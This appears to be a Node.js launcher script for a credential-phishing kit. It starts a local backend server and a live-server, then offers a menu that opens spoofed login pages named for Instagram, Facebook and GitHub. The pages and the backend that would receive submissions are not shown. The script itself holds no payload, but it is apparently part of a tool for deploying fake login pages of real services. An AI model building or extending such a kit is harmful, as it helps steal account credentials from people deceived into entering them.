const readline = require("readline");
const { spawn } = require("child_process");
const open = require("open").default;

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log("Starting backend server...");
spawn("node", ["server.js"], { stdio: "inherit" });


console.log("Starting Live Server...");
spawn("npx", ["live-server", "--port=5500", "--no-browser"], { stdio: "inherit", shell: true });

function showMenu() {
    console.log("\nSelect a login page:");
    console.log("1. Instagram");
    console.log("2. Facebook");
    console.log("3. GitHub");
    console.log("4. Exit");

    rl.question("Enter your choice (1-4): ", async (choice) => {
        let loginPage = "";

        switch (choice.trim()) {
            case "1":
                loginPage = "insta.html";
                break;
            case "2":
                loginPage = "fb-html.html";
                break;
            case "3":
                loginPage = "github.html";
                break;
            case "4":
                console.log("Exiting...");
                rl.close();
                return;
            default:
                console.log("Invalid choice. Please enter a number between 1 and 4.");
                showMenu();
                return;
        }

        console.log(`Opening ${loginPage} in browser...`);
        await open(`http://127.0.0.1:5500/${loginPage}`);

        
        showMenu();
    });
}

setTimeout(showMenu, 2000);
